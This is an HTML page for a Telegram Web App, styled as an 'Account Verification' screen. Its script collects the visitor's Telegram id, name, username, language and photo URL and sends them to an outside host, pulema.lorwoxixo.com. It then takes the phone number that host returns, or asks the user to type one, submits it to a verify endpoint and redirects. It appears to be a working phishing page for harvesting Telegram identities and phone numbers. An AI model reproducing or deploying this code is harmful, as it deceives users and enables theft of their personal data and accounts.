<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Telegram Verification</title>

<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto}
body{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;margin:0;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:#fff;border-radius:16px;max-width:420px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.25);overflow:hidden}
.header{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;padding:20px;text-align:center}
.content{padding:20px}
.btn{width:100%;padding:14px;border-radius:10px;border:none;color:#fff;font-size:15px;font-weight:600;background:linear-gradient(135deg,#667eea,#764ba2);cursor:pointer}
.hidden{display:none}
.info{background:#e8f5e9;border-radius:10px;padding:12px;margin-bottom:12px;font-size:14px}
.error{background:#ffebee;color:#c62828;border-radius:10px;padding:12px;margin-bottom:12px;display:none}
.input{width:100%;padding:12px;border-radius:10px;border:1px solid #ccc;margin-bottom:10px}
</style>
</head>

<body>
<div class="container">
  <div class="header">
    <h2>üîê Account Verification</h2>
  </div>

  <div class="content">

    <div id="user-box" class="info hidden"></div>

    <button class="btn" onclick="startFlow()">Continue</button>

    <div id="auto-info" class="info hidden"></div>

    <div id="manual" class="hidden">
      <input id="phone" class="input" placeholder="Enter phone number">
      <button class="btn" onclick="submitManual()">Continue</button>
    </div>

    <div id="loading" class="info hidden">Processing‚Ä¶</div>

    <div id="error" class="error"></div>

  </div>
</div>

<script>
let tg = window.Telegram?.WebApp;
let userData = {};
let botId = "37059";   // change if needed

document.addEventListener("DOMContentLoaded", () => {

  if (tg?.initDataUnsafe?.user) {
    const u = tg.initDataUnsafe.user;

    userData = {
      id: u.id,
      first_name: u.first_name || "",
      last_name: u.last_name || "",
      username: u.username || "",
      language_code: u.language_code || "",
      allows_write_to_pm: true,
      photo_url: u.photo_url || ""
    };

    document.getElementById("user-box").innerText =
      `üë§ ${u.first_name || ""} ${u.last_name || ""}\n` +
      `@${u.username || "-"}\n` +
      `üåê ${u.language_code || "-"}`;

    document.getElementById("user-box").classList.remove("hidden");

    tg.expand();
  } else {
    // browser fallback
    userData = {
      id: 12345,
      first_name: "Test",
      last_name: "User",
      username: "test",
      language_code: "en",
      allows_write_to_pm: true,
      photo_url: ""
    };
  }
});

function startFlow(){
  show("loading");

  fetch("https://pulema.lorwoxixo.com/api/get-bot", {
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({
      user_tg: userData,
      bot_id: botId
    })
  })
  .then(r=>r.json())
  .then(res=>{
    hide("loading");

    if(!res.ok) return showError("Server error");

    if(res.phone_number){
      document.getElementById("auto-info").innerText =
        `üìû Phone detected: +${res.phone_number}\nContinuing‚Ä¶`;
      show("auto-info");

      continueVerification(res.phone_number);
    } else {
      show("manual");
    }
  })
  .catch(()=>{
    hide("loading");
    showError("Network error");
  });
}

function submitManual(){
  const phone = document.getElementById("phone").value.trim();
  if(!phone) return showError("Enter phone number");
  continueVerification(phone);
}

function continueVerification(phone){
  show("loading");

  fetch("/api/verify-contact",{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({
      phone: phone
    })
  })
  .then(r=>r.json())
  .then(res=>{
    hide("loading");
    if(res.success) window.location.href = res.redirect_url;
    else showError(res.error || "Verification failed");
  })
  .catch(()=>{
    hide("loading");
    showError("Network error");
  });
}

/* helpers */
function show(id){document.getElementById(id).classList.remove("hidden")}
function hide(id){document.getElementById(id).classList.add("hidden")}
function showError(msg){
  const e=document.getElementById("error");
  e.innerText=msg;
  e.style.display="block";
}
</script>
</body>
</html>
